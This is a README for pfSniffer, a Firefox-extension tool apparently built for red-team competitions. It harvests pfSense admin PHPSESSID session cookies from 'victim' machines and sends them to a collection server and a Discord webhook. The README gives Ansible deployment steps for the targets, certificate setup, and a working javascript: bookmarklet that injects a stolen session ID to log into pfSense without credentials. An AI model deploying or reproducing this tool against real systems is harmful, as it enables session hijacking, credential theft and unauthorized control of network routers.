# **pfSniffer** *(pfSense Logger)*\
# UB Lockdown Branch

## Introduction
Logs pfSense control panel session IDs from the client side, then allows them to be used to login remotely
### Firefox Extension UUID
pfsense_logger@bithavenbuffalo.com

![Artist Credit: Austin Hall @FlareWare95](https://github.com/mcwillster/pfSniffer/blob/main/Images/Pfsniffer02/pfsniffer02.png)
Artist Credit: Austin Hall @FlareWare95

## Requirements
- Linux Computer for Ansible Controller/Server
    - Server IP must be 192.168.1.9
- Firefox Preinstalled on Victims
- pfSense Router
    - Router IP must be 192.168.1.254
### Note
These IPs will be changed for each comp, and hopefully I will update the README with the new IP requirements, but in the case I don't, check background.js and manifest.json

## Installation

### Step 1 (Unneeded if Ansible is already usable): Pre-Ansible Setup on Windows
Run these 2 commands in an **Administrator Powershell** on the target machines

***(New-Object -TypeName System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/ansible/ansible-documentation/devel/examples/scripts/ConfigureRemotingForAnsible.ps1", "$env:temp\ConfigureRemotingForAnsible.ps1")***

***powershell.exe -ExecutionPolicy ByPass -File "$env:temp\ConfigureRemotingForAnsible.ps1"***

#### Step 1.25: Pre-Ansible Setup for pfSense
Log into the pfSense WebGUI, navigate to System > Advanced > Admin Access, check the box for Enable Secure Shell, and click Save at the bottom. Ansible also needs Python to run tasks, so go to Diagnostics > Command Prompt. In the Execute Shell Command box, enter ***pkg install -y python3*** and click Execute.

#### Step 1.50: Pre-Ansible Setup for controller
Ansible must be ran on linux, and sshpass must be installed to use a password instead of private keys.

***sudo apt install sshpass***

### Step 2: Certificate Generation
You must generate new cert.pem and key.pem files as my key.pem file is not included in this repository (I'm not that stupid). I used this command to generate them, it will ask a few questions about location and org info. You don't have to answer anything. Unfortunately due to the nature of the Firefox extension, the server IP must be 192.168.1.9

***openssl req -x509 -newkey rsa:2048 -nodes -keyout server.key -out server.crt -days 365 -subj "//CN=192.168.1.9" -addext "basicConstraints=CA:FALSE" -addext "subjectAltName=IP:192.168.1.9"***

### Step 3: Download to Server/Ansible
Download the *Server* and *Ansible* folder to your Ansible controller/Server. Python Requests package must also be installed with:

***pip install Requests***


### Step 4: Run Ansible
You must edit hosts.ini to the IPs of the targets you wish to edit. These targets must all have step 1 performed on them prior to this, simply add a new line under windows with each IP. Then run this command on the Ansible controller, within the *Ansible* folder.

***ansible-playbook -i hosts.ini deploy.yml***

### Step 5 (Optional): Setup Bookmark on Any Computer You Want
Now, with everything on the victim/server side setup, you can optionally setup a bookmark on any computer, on any browser, to easily insert these PHPSESSID cookies into the login screen of pfSense and be logged in without knowing credentials. Go to your bookmark bar as if you're putting in any normal website bookmark, and paste this into the URL field.

***javascript:(function(){let id=prompt("Enter PHPSESSID:");if(id){document.cookie="PHPSESSID="+id+"; path=/";window.location.href="/";}else{alert("No session ID entered.");}})();***

## Usage
Any time the pfSense web GUI is visited or logged into, it will log a PHPSESSID into the cookies. pfSense Logger will grab this cookie and also send it back to the server, where the server will store it into a sqlite .db file. It is also configured to send it into a discord channel through a webhook. To use the bookmark, you must go to the pfSense webgui login screen and click the bookmark, where it will prompt you for your PHPSESSID. You enter this in and it will automatically log you in with that session ID